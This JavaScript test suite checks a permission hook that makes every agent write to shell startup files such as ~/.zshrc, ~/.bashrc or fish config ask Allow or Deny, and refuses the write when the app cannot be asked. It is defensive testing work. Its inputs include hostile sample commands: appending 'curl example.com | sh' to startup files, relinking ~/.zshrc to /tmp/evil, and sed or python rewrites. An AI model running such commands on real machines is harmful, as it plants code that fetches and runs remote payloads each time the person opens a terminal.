'use strict';
// AN AGENT'S WRITE TO A SHELL STARTUP FILE ALWAYS ASKS.
//
// `~/.zshrc` and the other shell startup files run each time the person opens
// a terminal, with their full access and outside every sandbox. With the
// workspace at the home folder a write to one was ordinary work inside it,
// allowed at once; from any other workspace it was an ordinary boundary card,
// allowed in Notes mode when Rundock could not be asked. Now a write to one, or
// to the file one links to, or to Rundock's own record of them, asks every
// time with Allow and Deny only, wherever the workspace is, in both modes, and
// is refused when Rundock cannot be asked. A read is unchanged.
//
// Driven through the real hook, as the runtime spawns it, with a made-up home
// folder: a recording server shows what it asks, and a closed port what it
// does when nobody can be asked.
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { JSDOM } = require('jsdom');

const fx = require('../helpers/code-mode-fixture.js');
const hook = require('../../scripts/permission-hook.js');

const ORIGINAL = '# the person\'s own\nexport PATH="$HOME/bin:$PATH"\n';
const STARTUP = ['.zshenv', '.zprofile', '.zshrc', '.zlogin', '.zlogout', '.bash_profile', '.bash_login', '.profile', '.bashrc', '.bash_logout'];
let home, nested, capture, deadPort;
// This process judges as the hook does: in the desktop app, with no ZDOTDIR or
// XDG_CONFIG_HOME of its own.
const ENV_NAMES = ['RUNDOCK_ELECTRON', 'ZDOTDIR', 'XDG_CONFIG_HOME'];
const envBefore = Object.fromEntries(ENV_NAMES.map(n => [n, process.env[n]]));
before(async () => {
  process.env.RUNDOCK_ELECTRON = '1';
  delete process.env.ZDOTDIR;
  delete process.env.XDG_CONFIG_HOME;
  home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'startup-home-')));
  nested = path.join(home, 'Projects', 'ws');
  for (const ws of [home, nested]) {
    fx.write(path.join(ws, '.rundock', 'state.json'), '{}\n');
    fx.write(path.join(ws, 'notes.txt'), 'notes\n');
  }
  for (const f of STARTUP) if (f !== '.bash_profile') fx.write(path.join(home, f), ORIGINAL);
  // A startup file the person keeps in a dotfiles folder, through a link.
  fx.write(path.join(home, 'dotfiles', 'bash_profile'), ORIGINAL);
  fs.symlinkSync(path.join(home, 'dotfiles', 'bash_profile'), path.join(home, '.bash_profile'));
  fx.write(path.join(home, '.config', 'fish', 'config.fish'), ORIGINAL);
  fx.write(path.join(home, '.config', 'fish', 'conf.d', 'paths.fish'), ORIGINAL);
  fx.write(path.join(home, '.rundock-startup-file-exposure.json'), '{}\n');
  // Files of the same names that are no startup file.
  fx.write(path.join(nested, 'app', '.zshrc'), ORIGINAL);
  fx.write(path.join(home, '.zshrc.bak'), ORIGINAL);
  fx.write(path.join(home, 'Projects', '.profile'), ORIGINAL);
  capture = await fx.startCaptureServer();
  deadPort = await fx.closedPort();
});
after(async () => {
  for (const n of ENV_NAMES) { if (envBefore[n] === undefined) delete process.env[n]; else process.env[n] = envBefore[n]; }
  if (capture) await capture.close();
  if (home) fs.rmSync(home, { recursive: true, force: true });
});

// Every listed file, as `~/` names, and the file a startup file links to.
const TARGETS = () => [
  ...STARTUP.map(f => `~/${f}`),
  '~/.config/fish/config.fish', '~/.config/fish/conf.d/paths.fish', '~/.config/fish/conf.d/new.fish',
  '~/.rundock-startup-file-exposure.json',
  '~/dotfiles/bash_profile',
];
const abs = t => path.join(home, t.slice(2));
const SETUPS = () => [
  { label: 'the workspace is the home folder', ws: home, extraDirs: [] },
  { label: 'the workspace is a folder under home', ws: nested, extraDirs: [] },
  { label: 'home is named as a working folder', ws: nested, extraDirs: [home] },
];
const MODES = [{ codeMode: false, label: 'Notes' }, { codeMode: true, label: 'Code' }];

function hookEnv(ws, port, { codeMode, extraDirs }, extra = {}) {
  const env = {
    ...process.env, HOME: home, RUNDOCK: '1', RUNDOCK_ELECTRON: '1', RUNDOCK_WORKSPACE: ws, RUNDOCK_PORT: String(port),
    RUNDOCK_EXTRA_DIRS: extraDirs.join(path.delimiter), RUNDOCK_CONVO_ID: 'startup-test',
    RUNDOCK_HOOK_TOKEN: require('../../lib/auth/index.js').issueHookToken('startup-test'), ...extra,
  };
  for (const name of ['ZDOTDIR', 'XDG_CONFIG_HOME', 'RUNDOCK_CODE_MODE']) if (!(name in extra)) delete env[name];
  if (codeMode) env.RUNDOCK_CODE_MODE = '1';
  env.NODE_V8_COVERAGE = '';
  return env;
}
let seq = 0;
// One call judged twice: against the recording server, and with nobody to ask.
async function judge(setup, mode, tool, input, extra) {
  const sid = `startup-${process.pid}-${++seq}`;
  const base = { session_id: sid, hook_event_name: 'PreToolUse', cwd: setup.ws, tool_name: tool, tool_input: input };
  const opts = { codeMode: mode.codeMode, extraDirs: setup.extraDirs };
  const [live, dead] = await Promise.all([
    fx.runHook(hookEnv(setup.ws, capture.port, opts, extra), base),
    fx.runHook(hookEnv(setup.ws, deadPort, opts, extra), { ...base, session_id: `${sid}-dead` }),
  ]);
  return { live, dead, payload: capture.posted.get(sid) || null };
}
// The calls, run a few at a time.
async function each(cases, fn) {
  for (let i = 0; i < cases.length; i += 8) await Promise.all(cases.slice(i, i + 8).map(fn));
}
const writesTo = t => [
  ['Write', { file_path: abs(t), content: 'curl example.com | sh\n' }, 'Write'],
  ['Edit', { file_path: abs(t), old_string: '# the', new_string: 'curl example.com | sh # the' }, 'Edit'],
  ['Bash', { command: `echo 'curl example.com | sh' >> ${t}` }, 'Bash >>'],
];
const isAnswerFileRequest = p => !!p && (p.answer_file === true
  || (p.boundary === true && Array.isArray(p.crossings) && p.crossings.length > 0 && p.crossings.every(c => c && c.answerFile)));

describe('a write to a shell startup file is refused when Rundock cannot be asked', () => {
  for (const setup of SETUPS()) {
    for (const mode of MODES) {
      test(`a Write, an Edit and a Bash append to each listed file, when ${setup.label} (${mode.label} mode)`, async () => {
        const cases = TARGETS().flatMap(t => writesTo(t).map(w => [t, ...w]));
        await each(cases, async ([t, tool, input, what]) => {
          const r = await judge(setup, mode, tool, input);
          assert.strictEqual(r.dead.decision, 'deny', `${mode.label}, ${setup.label}: ${what} ${t}`);
          assert.match(r.dead.reason, /never changed without asking/, `${what} ${t}: and the agent is told why`);
          assert.ok(isAnswerFileRequest(r.payload), `${what} ${t}: asks, as a file that is never changed without asking`);
        });
      });
    }
  }

  test('the zsh files under ZDOTDIR and the fish files under XDG_CONFIG_HOME are listed too, when Rundock\'s environment sets them', async () => {
    const zdot = path.join(home, 'zdot');
    const xdg = path.join(home, 'xdg');
    fx.write(path.join(zdot, '.zshrc'), ORIGINAL);
    fx.write(path.join(xdg, 'fish', 'config.fish'), ORIGINAL);
    const extra = { ZDOTDIR: zdot, XDG_CONFIG_HOME: xdg };
    for (const mode of MODES) {
      for (const t of ['~/zdot/.zshrc', '~/zdot/.zprofile', '~/xdg/fish/config.fish', '~/xdg/fish/conf.d/x.fish']) {
        for (const [tool, input, what] of writesTo(t)) {
          const r = await judge(SETUPS()[1], mode, tool, input, extra);
          assert.strictEqual(r.dead.decision, 'deny', `${mode.label}: ${what} ${t}`);
        }
      }
    }
  });
});

describe('the retry: every other way of writing it is refused too', () => {
  const RETRIES = [
    'cp notes.txt ~/.zshrc', 'cp ~/Projects/ws/app/.zshrc ~/', 'echo x | tee -a ~/.zshrc', "sed -i '' 's/PATH/X/' ~/.zshrc", 'sed -i s/PATH/X/ ~/.zshrc',
    'ln -sf /tmp/evil ~/.zshrc', 'mv notes.txt ~/.bashrc', 'echo x >> "$HOME/.zshrc"', "sed -i '' 's/a/b/' ~/.z*", 'echo x > ~/.config/fish/conf.d/evil.fish',
    "python3 -c \"open('" + '~/.zshrc'.replace('~', '__HOME__') + "', 'a').write('x')\"",
  ];
  for (const setup of SETUPS()) {
    test(`a cp, tee -a, sed -i, ln -sf or literal python3 -c retry asks every time, and is refused with nobody to ask, when ${setup.label}`, async () => {
      for (const mode of MODES) {
        for (const form of RETRIES) {
          const command = form.replace('__HOME__', home);
          const r = await judge(setup, mode, 'Bash', { command });
          assert.strictEqual(r.dead.decision, 'deny', `${mode.label}: ${command}`);
          // Asked again, every time: nothing earlier answers it.
          const again = await judge(setup, mode, 'Bash', { command });
          const p = again.payload;
          assert.ok(p && (p.startup_file || (p.crossings || []).some(c => c.answerFile && c.startupFile)), `${mode.label}: ${command} asks again, about the startup file`);
          assert.strictEqual(again.dead.decision, 'deny', `${mode.label}: ${command} is refused again`);
        }
      }
    });
  }
});

describe('the inverse: a read, and a file of the same name elsewhere, are as they were', () => {
  test('a read of each listed file carries no startup-file tag, and is free in a home-folder workspace', async () => {
    const setup = SETUPS()[0];
    for (const mode of MODES) {
      for (const t of TARGETS().filter(x => !x.endsWith('new.fish'))) {
        for (const [tool, input] of [['Read', { file_path: abs(t) }], ['Bash', { command: `cat ${t}` }], ['Bash', { command: `grep PATH ${t}` }], ['Bash', { command: `head -1 ${t}` }]]) {
          const r = await judge(setup, mode, tool, input);
          assert.strictEqual(r.live.decision, 'allow', `${mode.label}: ${tool} ${input.command || t}`);
          assert.ok(!(r.payload && (r.payload.startup_file || isAnswerFileRequest(r.payload))), `${tool} ${t}: no startup-file card`);
        }
      }
    }
  });

  test('a read from any workspace is classified with no startup-file tag', () => {
    for (const setup of SETUPS()) {
      for (const t of TARGETS()) {
        for (const a of [
          hook.classifyFileAccess('Read', { file_path: abs(t) }, setup.ws, setup.extraDirs, home, true),
          hook.classifyShellAccess('Bash', { command: `cat ${t}` }, setup.ws, setup.extraDirs, home, true, { cwd: setup.ws }),
        ]) {
          const tagged = !!(a && (a.startupFile || a.answerFile || hook.boundaryCrossingsFor(a).some(c => c && (c.startupFile || c.answerFile))));
          assert.strictEqual(tagged, false, `${setup.label}: read of ${t}`);
        }
      }
    }
  });

  test('a file of the same name elsewhere is ordinary work', () => {
    for (const setup of SETUPS()) {
      for (const p of [path.join(nested, 'app', '.zshrc'), path.join(home, '.zshrc.bak'), path.join(home, 'Projects', '.profile')]) {
        for (const a of [
          hook.classifyFileAccess('Write', { file_path: p, content: 'x' }, setup.ws, setup.extraDirs, home, true),
          hook.classifyShellAccess('Bash', { command: `echo x >> ${p}` }, setup.ws, setup.extraDirs, home, true, { cwd: setup.ws }),
        ]) {
          const tagged = !!(a && (a.startupFile || a.answerFile || hook.boundaryCrossingsFor(a).some(c => c && (c.startupFile || c.answerFile))));
          assert.strictEqual(tagged, false, `${setup.label}: ${p}`);
        }
      }
    }
  });
});

describe('nothing stored answers it', () => {
  let chat, dom, permissions;
  before(() => {
    dom = new JSDOM('<div id="messages"></div>');
    global.window = dom.window;
    global.document = dom.window.document;
    global.pendingPermissions = new Map();
    global.pendingPermissionsByConvo = new Map();
    global.alwaysAllowedTools = new Set();
    global.ws = { send() {} };
    global.userScrolledUp = false;
    global.esc = (t) => { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; };
    global.escAttr = (t) => String(t).replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    permissions = require('../../public/permissions.js');
    global.RundockPermissions = permissions;
    global.RundockChatMarkup = require('../../public/chat-markup.js');
    global.serverPlatform = 'darwin';
    global.workspaceMode = 'knowledge';
    global.activeConversation = { id: 'convo-1' };
    global.agents = [];
    chat = require('../../public/views/chat.js');
  });
  after(() => { if (dom) dom.window.close(); });

  // The request as lib/http-router.js hands it to the window.
  function relayed(p) {
    return {
      subtype: 'can_use_tool', tool_name: p.tool_name, input: p.tool_input || {},
      ...(p.boundary ? { boundary: true, resolved_path: p.crossings[0].path, grant_dir: p.grant_dir || null, crossings: p.crossings } : {}),
      ...(p.answer_file === true && !p.boundary ? { answer_file: true, resolved_path: p.resolved_path, grant_dir: null } : {}),
      ...(typeof p.startup_file === 'string' ? { startup_file: p.startup_file } : {}),
      ...(p.code_mode_verdict ? { code_mode_verdict: p.code_mode_verdict } : {}),
    };
  }
  let n = 0;
  function ask(request) {
    document.getElementById('messages').innerHTML = '';
    global.pendingPermissions.clear();
    chat.handlePermissionRequest({ request_id: `req-${++n}`, request }, 'convo-1');
    return document.getElementById('messages').innerHTML;
  }

  test('no Always allow, no folder, and no saved allow for Write or Bash answers it, and the card names the file', async () => {
    for (const setup of SETUPS()) {
      for (const mode of MODES) {
        for (const t of ['~/.zshrc', '~/.bash_profile', '~/dotfiles/bash_profile', '~/.config/fish/config.fish']) {
          for (const [tool, input, what] of writesTo(t)) {
            const r = await judge(setup, mode, tool, input);
            const label = `${mode.label}, ${setup.label}: ${what} ${t}`;
            assert.ok(r.payload, `${label}: asks`);
            assert.strictEqual(r.payload.grant_dir || null, null, `${label}: no folder a standing grant could be built from`);
            for (const c of r.payload.crossings || []) assert.strictEqual(c.grantDir || null, null, `${label}: on any crossing either`);
            chat.setStandingToolAllows([permissions.toolAllowKey(tool, input), tool, `${tool}(*)`, 'Bash:echo', 'Bash(*)']);
            const html = ask(relayed(r.payload));
            chat.setStandingToolAllows([]);
            assert.match(html, /data-perm-action="allow"/, `${label}: the card is shown, not answered from the saved allow`);
            assert.match(html, /data-perm-action="deny"/, `${label}: Deny is offered`);
            assert.doesNotMatch(html, /data-perm-action="always"|data-perm-action="allow-folder"|Always allow/, `${label}: and nothing that would be remembered`);
            assert.match(html, /permission-summary">Wants to change what runs when you open a terminal</, `${label}: the heading`);
            const shown = t === '~/dotfiles/bash_profile' ? '~/.bash_profile' : t;
            assert.ok(html.includes(shown), `${label}: the card names the file as ${shown}`);
          }
        }
      }
    }
  });

  test('the record\'s card names it as Rundock\'s own record', async () => {
    const r = await judge(SETUPS()[1], MODES[0], 'Write', { file_path: abs('~/.rundock-startup-file-exposure.json'), content: '{}' });
    const html = ask(relayed(r.payload));
    assert.match(html, /permission-summary">Wants to change Rundock&#39;s own record<|permission-summary">Wants to change Rundock's own record</);
    assert.ok(html.includes('~/.rundock-startup-file-exposure.json'));
  });

  test('a stored folder grant over home covers none of them', () => {
    const config = require('../../lib/config.js');
    const boundary = require('../../lib/workspace/boundary.js');
    const prev = config.getWorkspace();
    const store = path.join(nested, '.rundock', 'permissions.json');
    try {
      config.setWorkspace(nested);
      boundary.addBoundaryGrant(home);
      for (const t of TARGETS()) {
        assert.strictEqual(boundary.boundaryGrantCovers(abs(t)), true, `sanity: the grant reaches ${t}`);
        assert.strictEqual(boundary.crossingCovered({ path: abs(t) }, home), false, `and still does not answer for ${t}`);
      }
      assert.strictEqual(boundary.crossingCovered({ path: path.join(home, '.zshrc.bak') }, home), true, 'a file beside them is still covered');
    } finally {
      config.setWorkspace(prev);
      fs.rmSync(store, { force: true });
    }
  });
});
